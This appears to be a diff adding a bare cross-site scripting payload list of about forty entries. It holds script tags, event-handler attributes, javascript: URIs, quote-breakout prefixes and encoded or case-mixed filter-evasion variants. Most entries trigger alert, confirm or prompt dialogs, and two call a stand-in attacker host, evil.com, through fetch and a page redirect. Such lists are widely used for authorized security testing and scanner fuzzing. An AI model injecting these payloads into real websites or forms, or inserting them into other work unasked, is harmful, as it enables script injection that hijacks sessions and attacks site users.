@@ -1,0 +1,75 @@
+<script>alert(1)</script>
+
+<img src=x onerror=alert(1)>
+
+<svg onload=alert(1)>
+
+<body onload=alert(1)>
+
+<input autofocus onfocus=alert(1)>
+
+<iframe src="javascript:alert(1)"></iframe>
+
+"><script>alert(1)</script>
+
+'><script>alert(1)</script>
+
+"><img src=x onerror=alert(1)>
+
+'><img src=x onerror=alert(1)>
+
+javascript:alert(1)
+
+<details open ontoggle=alert(1)>
+
+<marquee onstart=alert(1)>
+
+<video><source onerror="alert(1)">
+
+<a href="javascript:alert(1)">click</a>
+
+<img src=1 href=1 onerror="javascript:alert(1)">
+
+<svg><script>alert(1)</script>
+
+"><svg onload=alert(1)>
+
+'><svg onload=alert(1)>
+
+%3Cscript%3Ealert(1)%3C/script%3E
+
+%253Cscript%253Ealert(1)%253C/script%253E
+
+<ScRiPt>alert(1)</ScRiPt>
+
+<script>confirm(1)</script>
+
+<script>prompt(1)</script>
+
+"><body onload=alert(1)>
+
+'><body onload=alert(1)>
+
+<img src=x onerror=confirm(1)>
+
+<img src=x onerror=prompt(1)>
+
+<svg/onload=alert(1)>
+
+<math href="javascript:alert(1)">CLICKME</math>
+
+<img src="x" onerror="fetch('https://evil.com')">
+
+<script>document.location='https://evil.com'</script>
+
+<embed src=javascript:alert(1)>
+
+<object data="javascript:alert(1)">
+
+<xml onreadystatechange=alert(1)>
+
+<xss id=x tabindex=1 onfocus=alert(1)></xss>
+
+<base href="javascript:alert(1);//">
+
+<data value="javascript:alert(1)"></data>
